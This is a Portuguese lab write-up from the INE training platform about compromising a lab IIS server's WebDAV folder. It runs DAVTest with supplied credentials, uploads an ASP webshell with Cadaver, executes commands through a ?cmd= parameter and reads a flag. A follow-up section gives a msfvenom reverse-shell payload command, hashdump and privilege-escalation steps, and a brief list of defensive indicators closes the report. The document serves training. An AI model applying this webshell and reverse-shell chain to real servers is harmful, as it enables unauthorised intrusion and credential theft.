# 🧪 Lab Report — IIS WebDAV: DAVTest + Cadaver + ASP Webshell

> **Plataforma:** INE
> **Tema central:** Descoberta de WebDAV protegido → DAVTest com credenciais → Upload de webshell ASP via Cadaver → RCE via IIS → Extração de flag
> **Alvo:** `demo.ine.local`

---

## 🎯 Objetivo

Explorar um diretório WebDAV em um servidor IIS protegido por autenticação HTTP Basic, identificar extensões executáveis, fazer upload de uma webshell ASP e executar comandos remotamente no sistema Windows.

---

## 🗺️ Topologia do Ataque

```
[Kali Attacker]
      |
    HTTP (porta 80)
      |
[demo.ine.local — IIS 10 Windows]
      |
   /webdav/  ← WebDAV habilitado, Basic Auth com bob:password_123321
      |
   webshell.asp  ← upload via Cadaver
      |
   RCE como IIS AppPool
```

---

## 📋 Sumário de Etapas

| # | Ação | Ferramenta | Resultado |
|---|------|-----------|-----------|
| 1 | Port scan | `nmap` | Porta 80 IIS aberta |
| 2 | Enumerar diretórios HTTP | `http-enum` NSE | `/webdav` descoberto (401) |
| 3 | DAVTest sem credencial | `davtest` | Falha — auth requerida |
| 4 | DAVTest com credencial | `davtest -auth` | ASP executável confirmado |
| 5 | Upload de webshell | `cadaver` | `webshell.asp` enviado |
| 6 | Acesso via browser/curl | HTTP | Execução de comandos |
| 7 | Reconhecimento | `whoami`, `dir` | `iis apppool\defaultapppool` |
| 8 | Extração de flag | `type C:\flag.txt` | `0cc175b9c0f1b6a831c399e269772661` |

---

## 🔬 Execução Passo a Passo

### Step 1 — Port Scan Inicial

```bash
nmap demo.ine.local
```

**Resultado relevante:**
```
80/tcp   open  http    Microsoft IIS httpd
```

**Por quê:** Confirmar serviços antes de atacar. IIS na porta 80 indica ambiente Windows — o vetor de script é ASP/ASPX, não PHP.

---

### Step 2 — Descoberta de Diretórios com http-enum

```bash
nmap --script http-enum -sV -p 80 demo.ine.local
```

**O que o script `http-enum` faz:** Testa uma lista interna de paths comuns (admin, webdav, phpmyadmin, etc.) e reporta os que existem com seus códigos HTTP de resposta.

**Resultado:**
```
/webdav/   → HTTP 401 Unauthorized
```

**Decodificando o 401:**

| Código | Significado | Implicação |
|--------|------------|-----------|
| 200 | Existe e acessível | Entrar direto |
| 401 | Existe + requer autenticação | **Credenciais necessárias** |
| 403 | Existe mas acesso negado | Tentar bypass |
| 404 | Não existe | Ignorar |

> 💡 `401` é melhor que `403` — o servidor está dizendo "existe, mas identifique-se". O `403` pode ser política de acesso. O `401` é só uma barreira de credencial.

---

### Step 3 — DAVTest sem Credencial (Confirmação do Problema)

```bash
davtest -url http://demo.ine.local/webdav
```

**Resultado:**
```
OPEN    FAIL    http://demo.ine.local/webdav  - 401 Unauthorized
```

O DAVTest não consegue nem abrir conexão sem credencial. Confirma que o `/webdav` está protegido por **HTTP Basic Authentication**.

---

### Step 4 — DAVTest com Credencial

```bash
davtest -auth bob:password_123321 -url http://demo.ine.local/webdav
```

**A flag `-auth`:** Passa as credenciais no formato `usuario:senha` para todas as requisições WebDAV.

**Resultado:**
```
OPEN            SUCCEED: http://demo.ine.local/webdav
MKCOL           SUCCEED: Created DavTestDir

PUT     asp     SUCCEED
PUT     aspx    SUCCEED
PUT     txt     SUCCEED
PUT     html    SUCCEED
PUT     php     SUCCEED
PUT     jsp     FAIL
PUT     cfm     FAIL

EXEC    asp     SUCCEED  ← ✅ RCE via ASP confirmado
EXEC    txt     SUCCEED  ← arquivo estático (não é RCE real)
EXEC    html    SUCCEED  ← arquivo estático (não é RCE real)
EXEC    aspx    FAIL
EXEC    php     FAIL
```

**Interpretação crítica:**

| Extensão | PUT | EXEC | Conclusão |
|---------|-----|------|-----------|
| `.asp` | ✅ | ✅ | **Vetor de RCE confirmado** |
| `.aspx` | ✅ | ❌ | Upload aceito mas não executado |
| `.php` | ✅ | ❌ | Upload aceito mas IIS não executa PHP |
| `.txt` | ✅ | ✅ | Retorna conteúdo mas não executa código |

> 🎯 ASP é o único que tem tanto `PUT SUCCEED` quanto `EXEC SUCCEED` com potencial de execução de código. É o vetor.

> 💡 `.txt` e `.html` aparecem como EXEC SUCCEED porque o servidor "serve" o arquivo — mas não há engine de script envolvida. Para RCE precisa de linguagem de script como ASP.

---

### Step 5 — Upload da Webshell via Cadaver

```bash
cadaver http://demo.ine.local/webdav
```

Prompt de credenciais:
```
Authentication required for webdav on server 'demo.ine.local':
Username: bob
Password: password_123321
```

```bash
dav:/webdav/> put /usr/share/webshells/asp/webshell.asp
dav:/webdav/> ls
```

**Por que usar `/usr/share/webshells/asp/webshell.asp`:**
O Kali Linux inclui webshells prontas e testadas. A `webshell.asp` do diretório padrão aceita comandos via parâmetro `?cmd=` na URL e tem uma interface HTML simples.

**Confirmação do upload:**
```
-rw-r--r--  1     0  Mar 17 02:00 webshell.asp
```

---

### Step 6 — Acesso e Execução via HTTP

#### Via Browser
```
http://demo.ine.local/webdav
# Credenciais: bob:password_123321

http://demo.ine.local/webdav/webshell.asp
# Interface HTML com campo de texto para inserir comandos
```

#### Via URL com Parâmetro
```
http://demo.ine.local/webdav/webshell.asp?cmd=whoami
```

**Por que URL encoding nos comandos:**
Caracteres especiais na URL precisam ser codificados:

| Caractere | URL Encoded |
|-----------|------------|
| Espaço | `+` ou `%20` |
| `\` | `%5C` |
| `:` | `%3A` |
| `/` | `%2F` |

```bash
# Equivalente via curl
curl "http://demo.ine.local/webdav/webshell.asp?cmd=whoami" \
  -u "bob:password_123321"
```

---

### Step 7 — Reconhecimento Pós-Acesso

```
# Quem sou eu?
?cmd=whoami
→ iis apppool\defaultapppool

# Informações do sistema
?cmd=systeminfo

# Conteúdo do C:\
?cmd=dir+C%3A%5C
```

**URL decoding dos comandos:**
```
dir+C%3A%5C
    ↓ decodifica
dir C:\
```

**Resultado do `dir C:\`:**
```
Volume in drive C has no label.
Directory of C:\

03/17/2026  02:00    <DIR>   inetpub
03/17/2026  02:00    <DIR>   Windows
03/17/2026  02:00            flag.txt   ← alvo
```

**Contexto do usuário `IIS AppPool\DefaultAppPool`:**

| Usuário | Nível | O Que Pode |
|---------|-------|-----------|
| `nt authority\system` | Máximo | Tudo |
| `administrator` | Admin | Quase tudo |
| `iis apppool\defaultapppool` | Serviço | Limitado — mas pode ler C:\ |
| `nt authority\network service` | Serviço | Muito limitado |

O AppPool tem acesso ao `C:\` neste caso — suficiente para ler a flag.

---

### Step 8 — Leitura da Flag

```
URL: http://demo.ine.local/webdav/webshell.asp?cmd=type+C%3A%5Cflag.txt

Decodificado: type C:\flag.txt
```

**Resultado:**
```
0cc175b9c0f1b6a831c399e269772661
```

---

## 📊 Resultado Final

| Informação | Valor |
|-----------|-------|
| Servidor | Microsoft IIS 10 |
| WebDAV | `/webdav/` — habilitado com Basic Auth |
| Credenciais | `bob:password_123321` |
| Extensão executável | `.asp` |
| Webshell | `webshell.asp` |
| Contexto de execução | `iis apppool\defaultapppool` |
| Flag | `0cc175b9c0f1b6a831c399e269772661` |

---

## 🧠 Conceitos Consolidados

### A Cadeia Completa WebDAV → RCE

```
http-enum descobre /webdav (401)
        ↓
DAVTest confirma credencial válida
        ↓
DAVTest confirma que .asp é executável
        ↓
Cadaver faz upload de webshell.asp
        ↓
HTTP GET /webdav/webshell.asp?cmd=
        ↓
IIS processa ASP → executa comando → retorna output
        ↓
RCE confirmado
```

### Por Que ASP e Não PHP/ASPX Neste Lab

O IIS tem **handlers de script** configurados — cada extensão é mapeada para um engine de processamento. Neste servidor:
- `.asp` → mapeado para engine ASP clássica ✅
- `.aspx` → upload aceito mas handler não configurado para este diretório ❌
- `.php` → PHP não instalado no IIS ❌

DAVTest descobriu isso automaticamente — sem precisar testar manualmente.

### URL Encoding — Referência Rápida para Webshell

```bash
# Comando → URL encoded
dir C:\         → dir+C%3A%5C
type C:\flag    → type+C%3A%5Cflag
net user        → net+user
whoami /all     → whoami+%2Fall
ipconfig /all   → ipconfig+%2Fall
```

---

## 🔁 Próximos Passos Lógicos

```
RCE como IIS AppPool obtido
        ↓
Gerar reverse shell (msfvenom)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe

        ↓
Upload via Cadaver
dav:/webdav/> put /tmp/shell.exe

        ↓
Executar via webshell
?cmd=shell.exe

        ↓
Listener no Metasploit → Meterpreter session
        ↓
hashdump → credenciais locais
        ↓
Escalonamento de privilégios (local_exploit_suggester)
```

---

## ⚠️ Indicadores de Comprometimento (Defesa)

```
Logs IIS: GET /webdav/webshell.asp?cmd=whoami
          200 OK — executado com sucesso

Monitoramento:
- Arquivo .asp criado em /webdav/ por usuário 'bob'
- Processo cmd.exe iniciado por w3wp.exe (worker do IIS)
- Acesso a C:\flag.txt pelo processo IIS
```

---

## 📌 Relacionados

- [[IIS — Internet Information Services]]
- [[Cadaver — Cliente WebDAV]]
- [[DAVTest — Testando WebDAV]]
- [[ASP Webshell — Upload e Execucao]]
- [[Metasploit — Fundamentos e Arquitetura]]
- [[Top 10 Vulnerabilidades — Servicos Windows]]

#lab #exploração #windows #iis #webdav #webshell
